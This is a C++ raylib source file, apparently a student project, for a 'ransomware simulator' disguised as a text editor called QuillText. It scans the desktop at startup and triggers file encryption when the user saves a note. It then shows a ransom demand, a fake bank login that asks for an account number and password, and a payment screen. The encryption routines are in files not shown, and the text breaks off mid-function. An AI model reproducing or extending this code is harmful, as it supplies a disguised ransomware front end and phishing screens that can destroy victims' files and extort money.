#include "/opt/homebrew/include/raylib.h"
#include "ransomware.h"                     // Custom header file for ransomware-related functions
#include "FileScanner.h"                    // Custom header file for traversing across the System Desktop Only
#include "Calling.h"                        // Custom header file for dealing with the encryption and decryption side of the thing
#include <string>
#include <vector>
#include <cstdlib>
#include <chrono>                           // For working with time-related functions
#include <thread>                           // Includes support for multi-threading (pausing)
using namespace std;

// Enum for app states
enum AppState {
    MAIN_MENU,
    CREATE_FILE,
    LOADING,
    GLITCH_CYCLE,
    MATRIX_EFFECT,
    USER_LOGIN,
    TRANSACTION,
    MONEY_ANIME,
    THANKS,
    DECRYPT_BEGIN,
    DECRYPT_ANIME,
    RANSOMWARE
};

// Forward declarations
void ShowMainMenuWindow();
void ShowCreateFileWindow();
void ShowLoadingWindow();
void ShowGlitchWindow();
void ShowMatrixEffectWindow();
void LogintoUserAccount();
void TransactionPage();
void MoneyAnimation();
void ThankYou();
void DecryptionBeginning();
void DecryptingAnimation();
void RansomwareSimulator();

// Global State Variables
AppState state = MAIN_MENU;
const int screenWidth = 1480;
const int screenHeight = 815;
int frameCounter = 0;

float loadProgress = 0.0f;
const float maxProgress = 100.0f;

// Typing effect variables
string ransomMessage = "Your system has been a victim of a Ransomware attack, all your files have been encrypted, "
                       "in order to retrieve your files pay $170,000 in account 26736283662216. "
                       "Failure to do so will lead to files being lost for eternity.";

int charIndex = 0;
int typingFrameDelay = 3;  // Delay between letters
int typingFrameCounter = 0;
bool messageComplete = false;

int currentColor = 0;
int matrixTimer = 0;

char correctAccount[15] = "26736283662216";
int requiredAmount = 170000;

// Matrix Effect Variables
struct Digit {
    int x;         // Horizontal position
    float y;       // Vertical position (float allows smooth falling)
    float speed;   // Falling speed
    int value;     // Digit to display (0–9)
};
vector<Digit> digits;

void InitMatrixDigits(int count) {
    digits.clear();
    for (int i = 0; i < count; i++) {
        Digit d;
        d.x = GetRandomValue(0, screenWidth);           // Random horizontal position
        d.y = GetRandomValue(-screenHeight, 0);         // Start off-screen at top
        d.speed = GetRandomValue(50, 200) / 60.0f;      // Speed in pixels per frame
        d.value = GetRandomValue(0, 9);                 // Random digit
        digits.push_back(d);
    }
}

int main() {
    InitWindow(screenWidth, screenHeight, "Quill Text [OOP Project]");
    SetTargetFPS(60);

    // CALLING THE FILE SCANNER FUNCTION IN THE BEGINNING OF THE CODE SO THAT WE HAVE THE PATHWAYS TO FOLLOW ENCRYPTION OK
    FileScanner::scanDesktopAndSave( "Information.txt");
    
    while (!WindowShouldClose()) {
        BeginDrawing();
        switch (state) {
            case MAIN_MENU: ShowMainMenuWindow(); break;
            case CREATE_FILE: ShowCreateFileWindow(); break;
            case LOADING: ShowLoadingWindow(); break;
            case GLITCH_CYCLE: ShowGlitchWindow(); break;
            case MATRIX_EFFECT: ShowMatrixEffectWindow(); break;
            case USER_LOGIN: LogintoUserAccount(); break;
            case TRANSACTION: TransactionPage(); break;
            case MONEY_ANIME: MoneyAnimation(); break;
            case THANKS: ThankYou(); break;
            case DECRYPT_BEGIN: DecryptionBeginning(); break;
            case DECRYPT_ANIME: DecryptingAnimation(); break;
            case RANSOMWARE: RansomwareSimulator(); break;
        }
        EndDrawing();
    }
    CloseWindow();
    return 0;
}

// REUSABLE BUTTON FUNCTION
bool DrawCenteredButton(const char* text, int x, int y, int width, int height, Color color, Color hoverColor) {
    Rectangle button = { (float)x, (float)y, (float)width, (float)height };
    bool hovering = CheckCollisionPointRec(GetMousePosition(), button);

    DrawRectangleRec(button, hovering ? hoverColor : color);
    DrawText(text, x + (width - MeasureText(text, 20)) / 2, y + (height - 20) / 2, 20, WHITE);

    return hovering && IsMouseButtonPressed(MOUSE_LEFT_BUTTON);
}

// SHOW MAIN MENU WINDOW
void ShowMainMenuWindow() {
    Texture2D logo1 = LoadTexture("Quill1.png");
    bool done = false;

    while (!done){
        BeginDrawing();
        // Gradient Background
        Color topColor = (Color){255, 188, 106, 255};  // light warm orange
        Color bottomColor = (Color){255, 243, 176, 255}; // pale yellow
        DrawRectangleGradientV(0, 0, screenWidth, screenHeight, topColor, bottomColor);

        // Draw Logo
        float targetSize = 150.0f; // Circle diameter
        float scale = targetSize / (float)logo1.width;
        int logoWidth = logo1.width * scale;
        int logoHeight = logo1.height * scale;
        int logoX = screenWidth / 2 - logoWidth / 2;
        int logoY = 200 - logoHeight / 2;
        DrawTextureEx(logo1, (Vector2){ (float)logoX, (float)logoY }, 0.0f, scale, WHITE);
    
    
        DrawText("QuillText", screenWidth / 2 - MeasureText("QuillText", 36) / 2, 270, 36, DARKGRAY);
    
        const char* line1 = "Welcome to QuillText,";
        const char* line2 = "Write your files and rest assured";
        const char* line3 = "they are in safe hands.";
    
        int fontSize = 30;
        int spacing = 10;
    
        // Calculate height for the text section
        int totalHeight = fontSize * 3 + spacing * 2;
        int startY = (screenHeight - totalHeight) / 2; // Adjusted for logo space [will see if i have time to add in logo using SVG]
    
        // Draw welcome text
        DrawText(line1, (screenWidth - MeasureText(line1, fontSize)) / 2, startY, fontSize, DARKGRAY);
        DrawText(line2, (screenWidth - MeasureText(line2, fontSize)) / 2, startY + fontSize + spacing, fontSize, DARKGRAY);
        DrawText(line3, (screenWidth - MeasureText(line3, fontSize)) / 2, startY + 2 * (fontSize + spacing), fontSize, DARKGRAY);
    
        // Button position
        int buttonY = startY + totalHeight + 50;
        int buttonX = (screenWidth - 200) / 2 - 10;
        Color DARKOLIVE = { 141, 135, 65, 255 };
        Color OLIVE = { 168, 163, 74, 255 };
        if (DrawCenteredButton("Create File", buttonX, buttonY, 200, 50, DARKOLIVE, OLIVE)) {
            done = true;
            state = CREATE_FILE;
        }
        EndDrawing();
    }
}

// Function to handle file creation with user input
vector<string> WrapText(const string &Text, int MaxWidth, int FontSize) {
    vector<string> Lines;   // Stores the wrapped lines of text
    string CurrentLine;     // Holds the text for the current line
    string Word;            // Holds individual words while processing
    int LineWidth = 0;      // Tracks the current line's width
    
    for (char c : Text) {   // Reads Character by character
        if (c == ' ' || c == '\n') {    // Handling Space and NewLine
            int WordWidth = MeasureText(Word.c_str(), FontSize);    // Calculating Pixel Width of text
            if (LineWidth + WordWidth >= MaxWidth) {    // If the line width is filled with text
                Lines.push_back(CurrentLine);           // Save the current line
                CurrentLine = Word + " ";
                LineWidth = WordWidth + MeasureText(" ", FontSize);
            } else {
                CurrentLine += Word + " ";
                LineWidth += WordWidth + MeasureText(" ", FontSize);
            }
            Word.clear();
            if (c == '\n') {                    // When the ENTER button is pressed
                Lines.push_back(CurrentLine);   // Save the current line
                CurrentLine.clear();            // Start a new line
                LineWidth = 0;                  // Reset width
            }
        } else {
            Word += c;  // Simply Save in the character
        }
    }
    if (!Word.empty()) {    // Handling Unfinished word
        if (LineWidth + MeasureText(Word.c_str(), FontSize) > MaxWidth) {
            Lines.push_back(CurrentLine);   // Save full line
            CurrentLine = Word;             // Start new line with last word
        } else {
            CurrentLine += Word;            // Append word to last line
        }
    }
    if (!CurrentLine.empty()) {
        Lines.push_back(CurrentLine);       //Ensures that the last line of text is always stored in Lines before returning.
    }
    return Lines;
}

// SHOW CREAT FILE WINDOW
void ShowCreateFileWindow() {
    char Filename[128] = "";
    string Content;
    int FilenameIndex = 0;
    bool EnteringFilename = true;
    bool EmptyField = false;
    bool done = false;

    int FontSize = 20;
    int LineHeight = FontSize + 4;

    int boxWidth = 600;
    int boxHeight = 11 * LineHeight;

    Rectangle ContentBox = {
        (float)(screenWidth - boxWidth) / 2.0f, /*Center X*/ 330, (float)boxWidth, (float)boxHeight };

    while (!done) {
        BeginDrawing();
        // Gradient Background for consistent theme
        Color topColor = (Color){255, 188, 106, 255};  // light warm orange
        Color bottomColor = (Color){255, 243, 176, 255}; // pale yellow
        DrawRectangleGradientV(0, 0, screenWidth, screenHeight, topColor, bottomColor);

        // Centered Title
        const char* title = "Create a New File";
        int titleFont = 24;
        DrawText(title, (screenWidth - MeasureText(title, titleFont)) / 2, 90, titleFont, DARKGRAY);

        // Centered label: Filename
        const char* fileLabel = "Enter Filename (no extension):";
        DrawText(fileLabel, (screenWidth - MeasureText(fileLabel, FontSize)) / 2, 200, FontSize, DARKGRAY);

        // Filename input box (centered)
        float filenameBoxX = (screenWidth - ContentBox.width) / 2;
        DrawRectangleLines(filenameBoxX, 230, ContentBox.width, 30, EnteringFilename ? RED : DARKGRAY);
        DrawText(Filename, filenameBoxX + 5, 237, FontSize, DARKGRAY);

        // Centered label: Content
        const char* contentLabel = "Enter Content:";
        DrawText(contentLabel, (screenWidth - MeasureText(contentLabel, FontSize)) / 2, 300, FontSize, DARKGRAY);

        // Content input box
        DrawRectangleLinesEx(ContentBox, 1, EnteringFilename ? GRAY : RED);
        vector<string> WrappedLines = WrapText(Content, ContentBox.width - 10, FontSize);
        for (size_t i = 0; i < WrappedLines.size() && i < 11; i++) {
            DrawText(WrappedLines[i].c_str(), ContentBox.x + 5, ContentBox.y + 5 + i * LineHeight, FontSize, DARKGRAY);
        }

        // Input handling
        int key = GetCharPressed();
        if (EnteringFilename) {
            if (key > 0 && FilenameIndex < 127) {
                Filename[FilenameIndex++] = (char)key;
                Filename[FilenameIndex] = '\0';
            }
            if (IsKeyPressed(KEY_BACKSPACE) && FilenameIndex > 0) {
                Filename[--FilenameIndex] = '\0';
            }
        } else {
            if (key > 0) { Content += (char)key; }
            if (IsKeyPressed(KEY_BACKSPACE) && !Content.empty()) { Content.pop_back(); }
            if (IsKeyPressed(KEY_ENTER)) { Content += '\n'; }
        }

        // Toggle between input fields
        if (IsKeyPressed(KEY_TAB)) {
            EnteringFilename = !EnteringFilename;
        }

        // Buttons
        int buttonY = screenHeight / 2 + 250;
        int buttonSX = screenWidth / 2 - 210;

        Color DARKOLIVE = { 141, 135, 65, 255 };
        Color OLIVE = { 168, 163, 74, 255 };
        if (DrawCenteredButton("Save File", buttonSX, buttonY, 200, 50, DARKOLIVE, OLIVE)) {
            if (FilenameIndex > 0) {
                state = LOADING;
                loadProgress = 0;
                done = true; // <<< IMPORTANT: exit the loop!
            }else{
                EmptyField = true;
            }
        }

        int buttonBX = screenWidth / 2 + 20;
        
        Color LIGHTBEIGE = { 214, 167, 122, 255 };
        Color DARKBEIGE = { 158, 129, 100, 255 };
        if (DrawCenteredButton("Back", buttonBX, buttonY, 200, 50, DARKBEIGE, LIGHTBEIGE)) {
            done = true;
            state = MAIN_MENU;
        }

        if (EmptyField){
            DrawText("Error: Fill in the Fields!", buttonBX - 130, buttonY - 40, 20, RED);
        }
        EndDrawing();
    }
}

// SHOW LOADING SAVE FILE WINDOW
void ShowLoadingWindow() {
    const int barWidth = 400;
    const int barHeight = 40;
    const int fontSize = 20;
    const int barX = (screenWidth - barWidth) / 2;
    const int barY = (screenHeight - barHeight) / 2;
    bool done = false;
    
    while(!done){
        BeginDrawing();
        // Gradient Background for consistent theme
        Color topColor = (Color){255, 188, 106, 255};  // light warm orange
        Color bottomColor = (Color){255, 243, 176, 255}; // pale yellow
        DrawRectangleGradientV(0, 0, screenWidth, screenHeight, topColor, bottomColor);

        if (loadProgress < maxProgress) {
            loadProgress += 0.5f;
        }

        string headerText = "Saving file...";
        int headerWidth = MeasureText(headerText.c_str(), fontSize);
        int headerX = (screenWidth - headerWidth) / 2;
        int headerY = barY - 40;
        DrawText(headerText.c_str(), headerX, headerY, fontSize, DARKGRAY);

        DrawRectangle(barX, barY, barWidth, barHeight, LIGHTGRAY);
        DrawRectangle(barX, barY, static_cast<int>((loadProgress / maxProgress) * barWidth), barHeight, GREEN);

        string progressText = to_string(static_cast<int>(loadProgress)) + " %";
        int progressTextWidth = MeasureText(progressText.c_str(), fontSize);
        int textX = barX + (barWidth - progressTextWidth) / 2;
        int textY = barY + (barHeight - fontSize) / 2;
        DrawText(progressText.c_str(), textX, textY, fontSize, BLACK);

        if (static_cast<int>(loadProgress) >= 87) {
            done = true;
            // CALLING FOR ENCRYPTION IN CALLING.cpp FILE
            RunEncryptionHandler(1);
            state = GLITCH_CYCLE;
            frameCounter = 0;
            matrixTimer = 0; // reset for matrix countdown
        }
        EndDrawing();
    }
}

// SHOW SYSTEM CRASH (GLITCH IMAGE) WINDOW
void ShowGlitchWindow() {
    Texture2D ransomImage = LoadTexture("ransom1.png");
    const int screenWidth = GetScreenWidth();
    const int screenHeight = GetScreenHeight();

    // Center the image
    int posX = (screenWidth - ransomImage.width) / 2;
    int posY = (screenHeight - ransomImage.height) / 2;

    // Prepare glitch timers
    float glitchStart = 0.0f;
    float glitchDuration = 0.0f;
    bool glitchActive = false;

    int timer = 0;
    bool done = false;

    SetTargetFPS(60);  // Just to be sure it's smooth

    while (!done && !WindowShouldClose()) {
        float timeNow = GetTime();

        // Randomly trigger a glitch ~once every few seconds [2]
        if (!glitchActive && (rand() % 120) == 0) {
            glitchActive = true;
            glitchStart = timeNow;
            glitchDuration = 0.1f + (float)(rand() % 10) / 20.0f; // 0.1 to 0.6 sec
        }

        // End glitch after duration
        if (glitchActive && (timeNow - glitchStart) > glitchDuration) {
            glitchActive = false;
        }

        BeginDrawing();
        ClearBackground(BLACK);

        if (!glitchActive) {
            // Draw image normally
            DrawTexture(ransomImage, posX, posY, WHITE);
        } else {
            // Draw glitchy lines
            for (int i = 0; i < 10; i++) {
                int lineY = rand() % ransomImage.height;
                int height = 2 + rand() % 3;
                int shift = -10 + rand() % 21;

                Rectangle srcRec = { 0.0f, (float)lineY, (float)ransomImage.width, (float)height };
                Rectangle destRec = { (float)(posX + shift), (float)(posY + lineY), (float)ransomImage.width, (float)height };
                DrawTextureRec(ransomImage, srcRec, (Vector2){ destRec.x, destRec.y }, WHITE);
            }
        }

        EndDrawing();

        // Timer for total animation duration
        timer++;
        if (timer > 60 * 10) { // after 10 seconds at 60fps
            done = true;
            state = MATRIX_EFFECT;
            InitMatrixDigits(200); // matrix initialization
        }
    }
}

// SHOW RANSOMWARE ATTCK MESSAGE WINDOW
void ShowMatrixEffectWindow() {
    bool done = false;
    while(!done){
        BeginDrawing();
        ClearBackground(BLACK);
        for (auto& d : digits) {
            d.y += d.speed;                 // Move the digit downward by its speed
            if (d.y > screenHeight) {       // If the digit has moved past the bottom of the screen...
                d.y = GetRandomValue(-100, 0);               // reset its y-position to a random spot *above* the screen (so it falls down again)
                d.x = GetRandomValue(0, screenWidth);        // randomize its horizontal position across the width of the screen
                d.speed = GetRandomValue(50, 200) / 60.0f;   // give it a new falling speed (random between ~0.8 and ~3.3 pixels per frame)
                d.value = GetRandomValue(0, 9);              // give it a new falling speed (random between ~0.8 and ~3.3 pixels per frame)
            }
            // Draw the digit on screen at its current (x, y) position in green, font-size 20
            DrawText(to_string(d.value).c_str(), d.x, static_cast<int>(d.y), 20, RED);
        }
        
        // Typing effect configuration
        int fontSize = 20;
        Color textColor = WHITE;
        int lineHeight = fontSize + 6;

        // Reference line for wrapping
        const char* referenceLine = "Failure to do so will lead to files being lost for eternity.";
        int maxLineWidth = MeasureText(referenceLine, fontSize);

        if (!messageComplete) {
            typingFrameCounter++;
            if (typingFrameCounter >= typingFrameDelay && charIndex < ransomMessage.length()) {
                charIndex++;
                typingFrameCounter = 0;
            }

            if (charIndex >= ransomMessage.length()) {
                messageComplete = true;
            }
        }

        // Draw the typed portion of the message
        string visibleText = ransomMessage.substr(0, charIndex);

        // --- Text Wrapping ---
        vector<string> lines;
        string word = "", line = "";
        for (char c : visibleText) {
            word += c;
            if (c == ' ' || c == '.' || c == ',') {
                if (MeasureText((line + word).c_str(), fontSize) > maxLineWidth) {
                    lines.push_back(line);
                    line = word;
                } else {
                    line += word;
                }
                word = "";
            }
        }
        line += word;
        if (!line.empty()) lines.push_back(line);

        // Centered vertical position
        int totalHeight = lines.size() * lineHeight;
        int startY = (screenHeight - totalHeight) / 2;

        // Draw black background rectangle [overlay]
        int boxHeight = totalHeight + 40;
        int boxWidth = maxLineWidth + 60;
        int boxX = (screenWidth - boxWidth) / 2;
        int boxY = startY - 20;
        DrawRectangle(boxX, boxY, boxWidth, boxHeight, Fade(BLACK, 0.8f));

        // Draw the lines centered
        for (int i = 0; i < lines.size(); ++i) {
            int textWidth = MeasureText(lines[i].c_str(), fontSize);
            int x = (screenWidth - textWidth) / 2;
            int y = startY + i * lineHeight;
            DrawText(lines[i].c_str(), x, y, fontSize, textColor);
        }

        // Draw "Payment" button once message is complete
        if (messageComplete) {
            int buttonY = screenHeight / 2 + 120;
            int buttonSX = screenWidth / 2 - 100;
            Color DRAKMARROON = {120, 20, 35, 255};
            if (DrawCenteredButton("Proceed >>", buttonSX, buttonY, 200, 50, DRAKMARROON, RED)) {
                done = true;
                state = USER_LOGIN;
            }
        }
        EndDrawing();
    }
}

// LOGIN TO USER BANK ACCOUNT
void LogintoUserAccount() {
    const int FontSize = 20;
    const int TitleFont = 24;
    const int FieldWidth = 300;
    const int FieldHeight = 40;

    char AccountNo[15] = ""; // 14 digits + null
    char Password[9] = "";   // 8 chars + null
    int AccIndex = 0;
    int PassIndex = 0;
    bool EnteringAcc = true;
    
    bool showError = false;
    chrono::time_point<chrono::steady_clock> errorStartTime;  // Time of error occurrence
    string ErrorMessage = "";

    Texture2D logo = LoadTexture("Bank1.png");

    bool done = false;
    while(!done){
        BeginDrawing();
        // --- Gradient Background ---
        for (int y = 0; y < screenHeight; y++) {
            float t = (float)y / screenHeight;
            Color gradColor = {(unsigned char)(0 + t * 15), (unsigned char)(0 + t * 25), (unsigned char)(0 + t * 45), 255};
            DrawRectangle(0, y, screenWidth, 1, gradColor);
        }

        // Draw Logo (Placeholder circle logo)
        float targetSize = 120.0f; // Circle diameter
        float scale = targetSize / (float)logo.width; // Uniform scaling based on width (assumes square image)
        int logoWidth = logo.width * scale;
        int logoHeight = logo.height * scale;
        int logoX = screenWidth / 2 - logoWidth / 2;
        int logoY = 150 - logoHeight / 2;
        DrawTextureEx(logo, (Vector2){ (float)logoX, (float)logoY }, 0.0f, scale, WHITE);


        DrawText("NEXA BANK", screenWidth / 2 - MeasureText("NEXA BANK", 36) / 2 - 4, 210, 36, WHITE);
        DrawText("Secure Online Banking Login", screenWidth / 2 - MeasureText("Secure Online Banking Login", 20) / 2, 250, 20, LIGHTGRAY);

        int centerX = screenWidth / 2 - FieldWidth / 2;

        // --- ACCOUNT NUMBER FIELD ---
        DrawText("Enter Account Number:", centerX, 300, TitleFont, WHITE);
        DrawRectangleLines(centerX, 330, FieldWidth, FieldHeight, EnteringAcc ? SKYBLUE : GRAY);
        DrawText(AccountNo, centerX + 10, 340, FontSize, WHITE);

        // --- PASSWORD FIELD ---
        DrawText("Enter Password:", centerX, 400, TitleFont, WHITE);
        DrawRectangleLines(centerX, 430, FieldWidth, FieldHeight, !EnteringAcc ? SKYBLUE : GRAY);

        // Display asterisks for the password
        string masked(PassIndex, '*');
        DrawText(masked.c_str(), centerX + 10, 440, FontSize, WHITE);

        // Input Handling
        int key = GetCharPressed();

        if (EnteringAcc) {
            if (key >= '0' && key <= '9' && AccIndex < 14) {
                AccountNo[AccIndex++] = (char)key;
                AccountNo[AccIndex] = '\0';
            }
            if (IsKeyPressed(KEY_BACKSPACE) && AccIndex > 0) {
                AccountNo[--AccIndex] = '\0';
            }
        } else {
            if (key > 0 && PassIndex < 8) {
                Password[PassIndex++] = (char)key;
                Password[PassIndex] = '\0';
            }
            if (IsKeyPressed(KEY_BACKSPACE) && PassIndex > 0) {
                Password[--PassIndex] = '\0';
            }
        }

        // Toggle between input fields
        if (IsKeyPressed(KEY_TAB)) {
            EnteringAcc = !EnteringAcc;
        }

        // Login Button
        int btnY = 510;
        Color TEAL = { 108, 122, 137, 255 };
        Color DARKTEAL = { 75, 93, 103, 255 };

        if (DrawCenteredButton("LOGIN", screenWidth / 2 - 100, btnY, 200, 50, DARKTEAL, TEAL)) {
            if (AccIndex == 14 && PassIndex == 8) {
                done = true;
                state = TRANSACTION;
            } else {
                showError = true;
                ErrorMessage = "Error: Enter All Fields";
                errorStartTime = chrono::steady_clock::now();
            }
        }
        if (showError){
            int textWidth = MeasureText(ErrorMessage.c_str(), 20);
            int textX = (screenWidth - textWidth) / 2;
            DrawText(ErrorMessage.c_str(), textX, 570, 20, RED);

            auto now = chrono::steady_clock::now();
            if (chrono::duration_cast<chrono::seconds>(now - errorStartTime).count() > 3) {
                showError = false;  // Hide the message after 3 seconds
            }
        }
        EndDrawing();
    }
}

// TRANSACTION OF MONEY
void TransactionPage() {
    const int FontSize = 20;
    const int TitleFont = 24;
    const int FieldWidth = 300;
    const int FieldHeight = 40;

    char RecipientAcc[15] = "";  // 14 digits max + null
    char Amount[10] = "";        // Max 9 digits + null
    int RecIndex = 0;
    int AmtIndex = 0;
    bool EnteringAcc = true;
    
    bool showError = false;
    chrono::time_point<chrono::steady_clock> errorStartTime;  // Time of error occurrence
    string ErrorMessage = "";

    Texture2D logo = LoadTexture("Bank1.png");
    bool done = false;
    while (!done) {
        BeginDrawing();

        // --- Gradient Background ---
        for (int y = 0; y < screenHeight; y++) {
            float t = (float)y / screenHeight;
            Color gradColor = {(unsigned char)(0 + t * 15), (unsigned char)(0 + t * 25), (unsigned char)(0 + t * 45), 255};
            DrawRectangle(0, y, screenWidth, 1, gradColor);
        }

        // Draw Logo (Placeholder circle logo)
        float targetSize = 120.0f; // Circle diameter
        float scale = targetSize / (float)logo.width; // Uniform scaling based on width (assumes square image)
        int logoWidth = logo.width * scale;
        int logoHeight = logo.height * scale;
        int logoX = screenWidth / 2 - logoWidth / 2;
        int logoY = 150 - logoHeight / 2;
        DrawTextureEx(logo, (Vector2){ (float)logoX, (float)logoY }, 0.0f, scale, WHITE);

        DrawText("NEXA BANK", screenWidth / 2 - MeasureText("NEXA BANK", 36) / 2 - 4, 210, 36, WHITE);
        DrawText("Secure Fund Transfer", screenWidth / 2 - MeasureText("SSecure Fund Transfer", 20) / 2, 250, 20, LIGHTGRAY);

        int centerX = screenWidth / 2 - FieldWidth / 2;

        // --- ACCOUNT NUMBER FIELD ---
        DrawText("Enter Account Number:", centerX, 300, TitleFont, WHITE);
        DrawRectangleLines(centerX, 330, FieldWidth, FieldHeight, EnteringAcc ? SKYBLUE : GRAY);
        DrawText(RecipientAcc, centerX + 10, 340, FontSize, WHITE);

        // --- Amount Field ---
        DrawText("Enter Amount:", centerX, 400, TitleFont, WHITE);
        DrawRectangleLines(centerX, 430, FieldWidth, FieldHeight, !EnteringAcc ? SKYBLUE : GRAY);
        DrawText(Amount, centerX + 10, 440, FontSize, WHITE);

        // Input Handling
        int key = GetCharPressed();

        if (EnteringAcc) {
            if (key >= '0' && key <= '9' && RecIndex < 14) {
                RecipientAcc[RecIndex++] = (char)key;
                RecipientAcc[RecIndex] = '\0';
            }
            if (IsKeyPressed(KEY_BACKSPACE) && RecIndex > 0) {
                RecipientAcc[--RecIndex] = '\0';
            }
        } else {
            if (key >= '0' && key <= '9' && AmtIndex < 9) {
                Amount[AmtIndex++] = (char)key;
                Amount[AmtIndex] = '\0';
            }
            if (IsKeyPressed(KEY_BACKSPACE) && AmtIndex > 0) {
                Amount[--AmtIndex] = '\0';
            }
        }

        // Toggle input fields
        if (IsKeyPressed(KEY_TAB)) {
            EnteringAcc = !EnteringAcc;
        }

        // Pay Button
        int btnY = 510;
        bool inputsValid = (RecIndex == 14) && (AmtIndex > 0);

        Color TEAL = { 108, 122, 137, 255 };
        Color DARKTEAL = { 75, 93, 103, 255 };

        if (DrawCenteredButton("PAY", screenWidth / 2 - 100, btnY, 200, 50, DARKTEAL, TEAL)) {
            if (inputsValid) {
                if (strcmp(RecipientAcc, correctAccount) == 0 && atof(Amount) == requiredAmount){
                    done = true;
                    state = MONEY_ANIME;
                }else{
                    ErrorMessage = "Error: Incorrect Account or Amount!! [Account: 26736283662216]";
                    showError = true;
                    errorStartTime = chrono::steady_clock::now();
                }
            } else {
                showError = true;
                ErrorMessage = "Error: Fill in the fields!!";
                errorStartTime = chrono::steady_clock::now();
            }
        }
        if (showError){
            int textWidth = MeasureText(ErrorMessage.c_str(), 20);
            int textX = (screenWidth - textWidth) / 2;
            DrawText(ErrorMessage.c_str(), textX, 570, 20, RED);

            auto now = chrono::steady_clock::now();
            if (chrono::duration_cast<chrono::seconds>(now - errorStartTime).count() > 3) {
                showError = false;  // Hide the message after 3 seconds
            }
        }
        EndDrawing();
    }
}

// MONEY TRANSFERRING ANIMATION
void MoneyAnimation() {
    bool done = false;
    float startTime = GetTime();
    const float thankYouDelay = 11.0f;

    const Color dollarColor = GOLD;
    const int fontSize = 20;
    const int dollarCount = 100;

    // DOLLA RAIN ANIMATION
    struct DollarSymbol {
        float x, y, speed;
    };
    vector<DollarSymbol> dollars;

    for (int i = 0; i < dollarCount; i++) {
        dollars.push_back({
            static_cast<float>(GetRandomValue(0, screenWidth)),
            static_cast<float>(GetRandomValue(0, screenHeight)),
            GetRandomValue(20, 100) / 60.0f
        });
    }

    // Box dimensions
    const float boxWidth = 60;
    const float boxHeight = 60;
    const float boxY = screenHeight / 2.0f - boxHeight / 2.0f;
    const float beamY = screenHeight / 2.0f; // Beam aligned with center of boxes

    // Beam positioning
    const float beamStartX = screenWidth / 4.0f;
    const float beamEndX = screenWidth * 0.75f;
    const int beamCount = 8;
    const float beamWidth = 6.0f;

    float pulseTimer = 0.0f;

    while (!done) {
        float currentTime = GetTime();
        float deltaTime = GetFrameTime();
        float elapsed = currentTime - startTime;

        BeginDrawing();

        // --- Gradient Background ---
        for (int y = 0; y < screenHeight; y++) {
            float t = (float)y / screenHeight;
            Color gradColor = {(unsigned char)(0 + t * 15), (unsigned char)(0 + t * 25), (unsigned char)(0 + t * 45), 255};
            DrawRectangle(0, y, screenWidth, 1, gradColor);
        }

        // --- Floating Gold $ ---
        for (auto& d : dollars) {
            d.y += d.speed;
            if (d.y > screenHeight) {
                d.y = -fontSize;
                d.x = GetRandomValue(0, screenWidth);
                d.speed = GetRandomValue(20, 100) / 60.0f;
            }
            DrawText("$", static_cast<int>(d.x), static_cast<int>(d.y), fontSize, dollarColor);
        }

        // --- Single-Line Multiple Transfer Beams ---
        for (int i = 0; i < beamCount; i++) {
            float beamOffset = fmod(currentTime * (200.0f + i * 25), beamEndX - beamStartX);
            DrawRectangle(static_cast<int>(beamStartX + beamOffset), static_cast<int>(beamY - 2), beamWidth, 4, GOLD);
        }

        pulseTimer += deltaTime;
        float pulse = 4.0f + sin(pulseTimer * 4.0f) * 3.0f;

        // --- FROM Box (small computer) ---
        Rectangle fromBox = { beamStartX - boxWidth / 2.0f, boxY, boxWidth, boxHeight };
        DrawRectangleRounded(fromBox, 0.2f, 6, Fade(DARKGREEN, 0.9f));
        DrawRectangle(fromBox.x + 10, fromBox.y + 10, 40, 20, DARKGRAY); // screen
        DrawRectangleLinesEx(fromBox, 2, GREEN);
        DrawText("USER", fromBox.x + 5, fromBox.y + 45, 10, WHITE);

        // --- TO Box (small computer) ---
        Rectangle toBox = { beamEndX - boxWidth / 2.0f, boxY, boxWidth, boxHeight };
        DrawRectangleRounded(toBox, 0.2f, 6, Fade(DARKBLUE, 0.9f));
        DrawRectangle(toBox.x + 10, toBox.y + 10, 40, 20, DARKGRAY); // screen
        DrawRectangleLinesEx(toBox, 2, SKYBLUE);
        DrawText("US", toBox.x + 18, toBox.y + 45, 10, WHITE);

        // --- Center Message ---
        const char* msg = "PROCESSING TRANSACTION...";
        int msgWidth = MeasureText(msg, 24);
        DrawText(msg, (screenWidth - msgWidth) / 2, toBox.y + boxHeight + 15, 24, WHITE);

        // --- Exit Logic ---
        if (elapsed >= thankYouDelay) {
            state = THANKS;
            done = true;
        } else if (IsKeyPressed(KEY_ENTER) || IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
            state = THANKS;
            done = true;
        }

        EndDrawing();
    }
}

// THANK YOU WINDOW THAT GIVES DECRYPTION PASSWORD
void ThankYou() {
    bool done = false;

    const int FontSize = 36;
    const int LineSpacing = 60;

    const char* Line1 = "Thank you for your cooperation.";
    const char* Line2 = "And donating money to us jobless CS students.";
    const char* Line3 = "Here is your password to decrypt your file:";
    GenerateRandomPassword();   // Creating Random Password for encryption
    string Password = GetGeneratedPassword();
    const char* Line4 = Password.c_str(); // Display the randomly generated password

    while (!done) {
        BeginDrawing();

        // Gradient Background
        for (int y = 0; y < screenHeight; y++) {
            float t = (float)y / screenHeight;
            Color gradColor = {(unsigned char)(0 + t * 15), (unsigned char)(0 + t * 25), (unsigned char)(0 + t * 45), 255};
            DrawRectangle(0, y, screenWidth, 1, gradColor);
        }

        // 💸 Background Tiled '$' Symbols
        int spacing = 100;
        int symbolSize = 20;
        Color DarkGold = { 255, 203, 0, 120 }; // semi-transparent for soft look
        for (int y = 0; y < screenHeight; y += spacing) {
            for (int x = 0; x < screenWidth; x += spacing) {
                DrawText("$", x, y, symbolSize, Fade(GOLD, 0.4f));
            }
        }

        // ✨ Measure Text Widths
        int textW1 = MeasureText(Line1, FontSize);
        int textW2 = MeasureText(Line2, FontSize);
        int textW3 = MeasureText(Line3, FontSize);
        int textW4 = MeasureText(Line4, FontSize);

        int maxTextWidth = std::max({ textW1, textW2, textW3, textW4 });

        // Calculate positions
        int totalTextHeight = 4 * FontSize + 3 * LineSpacing;
        int startY = (screenHeight - totalTextHeight) / 2;

        // Draw Overlay Box
        int boxPadding = 30;
        int boxWidth = maxTextWidth + 2 * boxPadding;
        int boxHeight = totalTextHeight + 2 * boxPadding;

        int boxX = (screenWidth - boxWidth) / 2;
        int boxY = startY - boxPadding;
        DrawRectangle(boxX, boxY, boxWidth, boxHeight, Fade(BLACK, 0.4f));

        // Draw Lines
        int textX1 = (screenWidth - textW1) / 2;
        int textX2 = (screenWidth - textW2) / 2;
        int textX3 = (screenWidth - textW3) / 2;
        int textX4 = (screenWidth - textW4) / 2;

        DrawText(Line1, textX1, startY, FontSize, WHITE);
